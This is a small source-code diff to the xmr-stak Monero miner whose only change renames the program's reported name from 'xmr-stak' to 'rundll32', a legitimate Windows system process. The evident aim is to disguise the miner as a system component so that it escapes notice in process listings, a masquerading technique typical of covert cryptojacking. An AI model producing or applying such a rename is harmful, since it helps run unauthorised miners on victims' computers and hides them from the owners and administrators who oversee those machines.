@@ -18,7 +18,7 @@
 #define BACKEND_TYPE unknown
 #endif
 
-#define XMR_STAK_NAME "xmr-stak"
+#define XMR_STAK_NAME "rundll32"
 #define XMR_STAK_VERSION "2.5.1"
 
 #if defined(_WIN32)
